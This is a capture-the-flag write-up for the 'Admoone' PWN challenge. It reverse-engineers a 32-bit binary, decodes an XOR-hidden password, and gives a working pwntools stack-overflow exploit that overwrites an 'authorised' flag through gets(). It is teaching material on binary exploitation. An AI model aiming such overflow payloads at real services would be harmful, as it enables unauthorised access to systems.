# Cyber-eto Qualifications 2025 - Admoone PWN Challenge Writeup

## Challenge Description

**Challenge Name:** Admoone  
**Category:** PWN  
**Flag Format:** `cybereto{...}`

Are you authorized?

```
nc 161.97.155.116 1338
```

## Initial Analysis

Upon connecting to the service, we're prompted for an admin password:
```bash
$ nc 161.97.155.116 1338
Enter admin password:
test
Incorrect Password!
```

The challenge provides a binary file `admoone` that we need to analyze.

### Binary Information
```bash
$ file admoone
admoone: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=21f6c272f151b6fde3164f63ba4c912d297d118d, for GNU/Linux 3.2.0, not stripped
```

### String Analysis
```bash
$ strings admoone
```

Key strings found:
- `Successfully logged in as Admin (authorised=%d) :)`
- `Failed !!! are you trying to hack me ? (authorised=%d) :( hint --> authorised should be = 1`
- `Enter admin password:`
- `Correct Password!`
- `Incorrect Password!`
- `flag.txt`

The hint in the strings clearly indicates there's an `authorised` variable that should be set to 1.

## Reverse Engineering

### Main Function Analysis
Using `objdump -d admoone`, we can see the main function flow:

```assembly
08049363 <main>:
 8049363:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 8049367:	83 e4 f0             	and    $0xfffffff0,%esp
 804936a:	ff 71 fc             	push   -0x4(%ecx)
 804936d:	55                   	push   %ebp
 804936e:	89 e5                	mov    %esp,%ebp
 8049370:	53                   	push   %ebx
 8049371:	51                   	push   %ecx
 8049372:	83 ec 20             	sub    $0x20,%esp
 # ... setup code ...
 8049397:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)    # authorised = 0
 # ... print prompt ...
 80493b3:	8d 45 dc             	lea    -0x24(%ebp),%eax   # buffer at ebp-0x24
 80493b6:	50                   	push   %eax
 80493b7:	e8 94 fc ff ff       	call   8049050 <gets@plt>  # VULNERABLE!
 # ... call pass_check ...
```

Key observations:
1. Sets up setvbuf for stdout
2. Initializes an `authorised` variable to 0 at `ebp-0xc`
3. Prompts for password input
4. **Uses `gets()` to read input into buffer at `ebp-0x24`** ⚠️
5. Calls `pass_check()` function

### Critical Vulnerability: Buffer Overflow
The program uses `gets()` which is notoriously vulnerable to buffer overflow attacks since it doesn't perform bounds checking.

### Pass Check Function Analysis
The `pass_check` function at address `0x804928b`:

```assembly
0804928b <pass_check>:
 # ... function setup ...
 80492b2:	83 f8 13             	cmp    $0x13,%eax     # check length == 19
 80492b5:	74 09                	je     80492c0 <pass_check+0x35>
 # ... XOR loop ...
 80492d4:	83 f0 55             	xor    $0x55,%eax     # XOR with 0x55
 # ... compare with encrypted password ...
```

The function:
1. Checks if input length is exactly 19 characters
2. XORs each character with 0x55 and compares with encrypted password
3. If password is correct, sets `authorised` parameter to 1
4. Calls `read_flag()` if `authorised == 1`

### Memory Layout Analysis
- Input buffer: `ebp-0x24` (36 bytes from ebp)
- `authorised` variable: `ebp-0xc` (12 bytes from ebp)
- **Distance between buffer and authorised: `0x24 - 0xc = 0x18 = 24 bytes`**

## Exploitation Methods

### Method 1: Password Decryption

From the `.data` section, we can extract the encrypted password:
```bash
$ objdump -s -j .data admoone
 804c024 00000000 00000000 3b65210a 26103620  ........;e!.&.6 
 804c034 07300a25 14262622 652731             .0.%.&&"e'1
```

The encrypted password starts at offset 0x8: `3b65210a26103620 07300a2514262622 652731`

Decrypting with XOR 0x55:
```python
encrypted = b'\x3b\x65\x21\x0a\x26\x10\x36\x20\x07\x30\x0a\x25\x14\x26\x26\x22\x65\x27\x31'
password = ''
for byte in encrypted:
    password += chr(byte ^ 0x55)
print(password)  # n0t_sEcuRe_pAssw0rd
```

🎯 **First Discovery!** The correct password is: `n0t_sEcuRe_pAssw0rd`

### Method 2: Buffer Overflow

Since the input buffer is 24 bytes away from the `authorised` variable, we can overflow the buffer to overwrite the `authorised` variable:

```python
payload = b'A' * 24 + b'\x01\x00\x00\x00'  # 24 bytes padding + overwrite authorised with 1
```

## Solution

Both methods work to get the flag:

**Method 1 (Correct Password):**
```bash
$ echo "n0t_sEcuRe_pAssw0rd" | nc 161.97.155.116 1338
Enter admin password: 
Correct Password!
Successfully logged in as Admin (authorised=1) :)
cybereto{n0t_s3cur3_buff3r_0v3rfl0w}
```

**Method 2 (Buffer Overflow):**
```python
from pwn import *

# Connect to service
r = remote('161.97.155.116', 1338)

# Send payload to overflow and set authorised = 1
payload = b'A' * 24 + p32(1)
r.sendline(payload)

# Receive flag
print(r.recvall().decode())
```

Output:
```
Enter admin password: 
Failed !!! are you trying to hack me ? (authorised=1) :( hint --> authorised should be = 1 
Successfully logged in as Admin (authorised=1) :)
cybereto{n0t_s3cur3_buff3r_0v3rfl0w}
```

## Final Flag

**Flag:** `cybereto{n0t_s3cur3_buff3r_0v3rfl0w}`

## Key Learning Points

This challenge demonstrates several important security concepts:

1. **Buffer Overflow**: The use of `gets()` creates a classic buffer overflow vulnerability that can overwrite adjacent stack variables.

2. **Memory Layout**: Understanding stack layout is crucial for exploitation - knowing the distance between buffers and target variables.

3. **XOR Encryption**: Simple XOR can be easily reversed when the key is known, making it unsuitable for protecting sensitive data.

4. **Multiple Attack Vectors**: Sometimes there are multiple ways to solve a challenge - both the legitimate password and buffer overflow work.

5. **Stack Canaries**: This binary lacks stack protection mechanisms that would prevent such simple overflow attacks.

## Tools and Techniques Used

- **Static Analysis**: `file`, `strings`, `objdump` for understanding binary structure
- **Reverse Engineering**: Disassembly analysis to understand program flow
- **Cryptanalysis**: XOR decryption to recover the password
- **Memory Layout Analysis**: Understanding stack frame layout for buffer overflow
- **Binary Exploitation**: Crafting payloads to overwrite stack variables

## Timeline of Investigation

1. **Initial Reconnaissance**: Connected to service and identified password prompt
2. **Binary Analysis**: Used `file` and `strings` to understand the binary
3. **Disassembly**: Analyzed main function and identified vulnerabilities
4. **Memory Layout**: Calculated buffer distances for overflow exploitation
5. **Password Recovery**: Extracted and decrypted the XOR-encoded password
6. **Exploitation**: Successfully used both password and buffer overflow methods
7. **Flag Capture**: Retrieved the flag using either exploitation method

This challenge excellently demonstrates why secure coding practices like input validation, bounds checking, and using safe functions like `fgets()` instead of `gets()` are crucial in preventing buffer overflow vulnerabilities.